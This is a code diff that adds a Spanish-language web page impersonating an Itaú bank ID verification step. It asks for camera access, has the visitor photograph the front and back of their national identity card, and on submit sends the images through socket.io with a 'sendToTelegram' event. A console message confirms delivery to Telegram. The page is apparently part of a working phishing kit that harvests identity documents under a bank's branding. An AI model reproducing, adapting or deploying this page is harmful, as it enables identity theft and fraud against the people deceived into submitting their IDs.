@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Itaú - Escaneo de Cédula</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 540px;
+            margin: 0;
+            padding: 20px;
+            padding-left: 25px;
+            padding-bottom: 100px;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 35px;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .camera-section {
+            margin-bottom: 25px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 15px;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            aspect-ratio: 16/10;
+            background-color: #f5f5f5;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            border: 2px solid #cccccc;
+        }
+
+        .camera-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-container canvas {
+            display: none;
+        }
+
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(0, 0, 0, 0.3);
+            pointer-events: none;
+        }
+
+        .camera-guide {
+            border: 3px solid #fe6200;
+            border-radius: 12px;
+            width: 85%;
+            height: 70%;
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.4);
+        }
+
+        .preview-image {
+            display: none;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .capture-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #fe6200;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .capture-btn:hover {
+            background-color: #e55800;
+        }
+
+        .capture-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .retake-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #ffffff;
+            color: #fe6200;
+            border: 2px solid #fe6200;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            display: none;
+        }
+
+        .retake-btn:hover {
+            background-color: #fff5f0;
+        }
+
+        .status-message {
+            text-align: center;
+            font-size: 13px;
+            color: #666666;
+            margin-top: 10px;
+        }
+
+        .status-message.success {
+            color: #28a745;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 14px;
+            height: 14px;
+            min-width: 14px;
+            min-height: 14px;
+            margin-top: 2px;
+            cursor: pointer;
+            flex-shrink: 0;
+            appearance: none;
+            border: 1.5px solid #cccccc;
+            border-radius: 2px;
+            background-color: #ffffff;
+            position: relative;
+        }
+
+        .checkbox-group input[type="checkbox"]:checked {
+            background-color: #fe6200;
+            border-color: #fe6200;
+        }
+
+        .checkbox-group input[type="checkbox"]:checked::after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #ffffff;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #000000;
+            line-height: 1.4;
+        }
+
+        .checkbox-label a {
+            color: #0066cc;
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #e8e8e8;
+            color: #b8b8b8;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: not-allowed;
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            max-width: 540px;
+            margin: 0 auto;
+            letter-spacing: 0.2px;
+        }
+
+        .submit-btn.active {
+            background-color: #fe6200;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: #e55800;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-icon {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .loading-icon::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            background-color: #fe6200;
+            border-radius: 10px;
+        }
+
+        .loading-icon::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90px;
+            height: 90px;
+            border: 3px solid #fe6200;
+            border-radius: 15px;
+            opacity: 0.3;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .loading-ring {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 110px;
+            height: 110px;
+            border: 3px solid #fe6200;
+            border-radius: 18px;
+            opacity: 0.2;
+            animation: pulse 2s ease-in-out infinite 0.5s;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.2;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.1);
+                opacity: 0.1;
+            }
+        }
+
+        .loading-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 500px;
+            }
+            .submit-btn {
+                max-width: 500px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-icon">
+            <div class="loading-ring"></div>
+        </div>
+        <h2 class="loading-text">Te damos la bienvenida a Itaú</h2>
+    </div>
+
+    <div class="container">
+        <div class="logo">
+            <img src="img/itau-logo.png" alt="Itaú">
+        </div>
+
+        <h1>Escaneo de Cédula</h1>
+        <p class="subtitle">Por favor, toma una foto clara de tu cédula. Primero el frente y luego el reverso. Asegúrate de que toda la información sea legible.</p>
+
+        <!-- Frente de la cédula -->
+        <div class="camera-section">
+            <h2 class="section-title">Frente de la Cédula</h2>
+            <div class="camera-container" id="frontContainer">
+                <video id="frontVideo" autoplay playsinline></video>
+                <canvas id="frontCanvas"></canvas>
+                <img id="frontPreview" class="preview-image">
+                <div class="camera-overlay">
+                    <div class="camera-guide"></div>
+                </div>
+            </div>
+            <button class="capture-btn" id="frontCaptureBtn" disabled>Capturar Frente</button>
+            <button class="retake-btn" id="frontRetakeBtn">Tomar de Nuevo</button>
+            <p class="status-message" id="frontStatus">Iniciando cámara...</p>
+        </div>
+
+        <!-- Reverso de la cédula -->
+        <div class="camera-section">
+            <h2 class="section-title">Reverso de la Cédula</h2>
+            <div class="camera-container" id="backContainer">
+                <video id="backVideo" autoplay playsinline></video>
+                <canvas id="backCanvas"></canvas>
+                <img id="backPreview" class="preview-image">
+                <div class="camera-overlay">
+                    <div class="camera-guide"></div>
+                </div>
+            </div>
+            <button class="capture-btn" id="backCaptureBtn" disabled>Capturar Reverso</button>
+            <button class="retake-btn" id="backRetakeBtn">Tomar de Nuevo</button>
+            <p class="status-message" id="backStatus">Iniciando cámara...</p>
+        </div>
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="acceptPolicy" name="acceptPolicy">
+            <label for="acceptPolicy" class="checkbox-label">
+                Acepto el <a href="#">uso y tratamiento de datos personales.</a>
+            </label>
+        </div>
+
+        <button class="submit-btn" id="submitBtn">Continuar</button>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="socket-handler.js"></script>
+    <script>
+        
+        let frontStream = null;
+        let backStream = null;
+        let frontCaptured = false;
+        let backCaptured = false;
+        
+        const frontVideo = document.getElementById('frontVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const frontPreview = document.getElementById('frontPreview');
+        const frontCaptureBtn = document.getElementById('frontCaptureBtn');
+        const frontRetakeBtn = document.getElementById('frontRetakeBtn');
+        const frontStatus = document.getElementById('frontStatus');
+        
+        const backVideo = document.getElementById('backVideo');
+        const backCanvas = document.getElementById('backCanvas');
+        const backPreview = document.getElementById('backPreview');
+        const backCaptureBtn = document.getElementById('backCaptureBtn');
+        const backRetakeBtn = document.getElementById('backRetakeBtn');
+        const backStatus = document.getElementById('backStatus');
+        
+        const acceptPolicy = document.getElementById('acceptPolicy');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        // Initialize cameras
+        async function initCamera(videoElement, statusElement, captureBtn) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'environment',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    } 
+                });
+                videoElement.srcObject = stream;
+                statusElement.textContent = 'Posiciona tu cédula dentro del marco';
+                statusElement.classList.remove('success');
+                captureBtn.disabled = false;
+                return stream;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                statusElement.textContent = 'Error al acceder a la cámara';
+                statusElement.style.color = '#dc3545';
+                return null;
+            }
+        }
+
+        // Capture photo
+        function capturePhoto(video, canvas, preview, stream, statusElement, captureBtn, retakeBtn) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+            preview.src = imageData;
+            preview.style.display = 'block';
+            video.style.display = 'none';
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            captureBtn.style.display = 'none';
+            retakeBtn.style.display = 'block';
+            statusElement.textContent = 'Foto capturada correctamente ✓';
+            statusElement.classList.add('success');
+            
+            return imageData;
+        }
+
+        // Retake photo
+        async function retakePhoto(videoElement, preview, statusElement, captureBtn, retakeBtn, isFront) {
+            preview.style.display = 'none';
+            videoElement.style.display = 'block';
+            captureBtn.style.display = 'block';
+            retakeBtn.style.display = 'none';
+            
+            if (isFront) {
+                frontCaptured = false;
+                frontStream = await initCamera(videoElement, statusElement, captureBtn);
+            } else {
+                backCaptured = false;
+                backStream = await initCamera(videoElement, statusElement, captureBtn);
+            }
+            
+            checkFormValidity();
+        }
+
+        // Front capture
+        frontCaptureBtn.addEventListener('click', () => {
+            frontCaptured = true;
+            capturePhoto(frontVideo, frontCanvas, frontPreview, frontStream, frontStatus, frontCaptureBtn, frontRetakeBtn);
+            checkFormValidity();
+        });
+
+        frontRetakeBtn.addEventListener('click', () => {
+            retakePhoto(frontVideo, frontPreview, frontStatus, frontCaptureBtn, frontRetakeBtn, true);
+        });
+
+        // Back capture
+        backCaptureBtn.addEventListener('click', () => {
+            backCaptured = true;
+            capturePhoto(backVideo, backCanvas, backPreview, backStream, backStatus, backCaptureBtn, backRetakeBtn);
+            checkFormValidity();
+        });
+
+        backRetakeBtn.addEventListener('click', () => {
+            retakePhoto(backVideo, backPreview, backStatus, backCaptureBtn, backRetakeBtn, false);
+        });
+
+        // Check form validity
+        acceptPolicy.addEventListener('change', checkFormValidity);
+
+        function checkFormValidity() {
+            if (frontCaptured && backCaptured && acceptPolicy.checked) {
+                submitBtn.classList.add('active');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+            }
+        }
+
+        // Submit
+        submitBtn.addEventListener('click', () => {
+            if (submitBtn.classList.contains('active')) {
+                loadingOverlay.classList.add('active');
+                
+                const frontImage = frontCanvas.toDataURL('image/jpeg', 0.8);
+                const backImage = backCanvas.toDataURL('image/jpeg', 0.8);
+                
+                const cedulaData = {
+                    bank: 'Itaú',
+                    page: 'cedula',
+                    front: frontImage,
+                    back: backImage
+                };
+
+                window.itauSocket.emit('updatePage', { 
+                    sessionId: window.getSessionId(), 
+                    page: 'itau-cedula' 
+                });
+
+                window.itauSocket.emit('sendToTelegram', {
+                    sessionId: window.getSessionId(),
+                    data: cedulaData
+                });
+            }
+        });
+
+        // Socket listeners
+        window.itauSocket.on('telegramSent', (data) => {
+            console.log('✅ Cédula enviada correctamente a Telegram');
+        });
+
+        // Initialize both cameras on load
+        window.addEventListener('load', async () => {
+            frontStream = await initCamera(frontVideo, frontStatus, frontCaptureBtn);
+            backStream = await initCamera(backVideo, backStatus, backCaptureBtn);
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (frontStream) frontStream.getTracks().forEach(track => track.stop());
+            if (backStream) backStream.getTracks().forEach(track => track.stop());
+        });
+    </script>
+</body>
+</html>
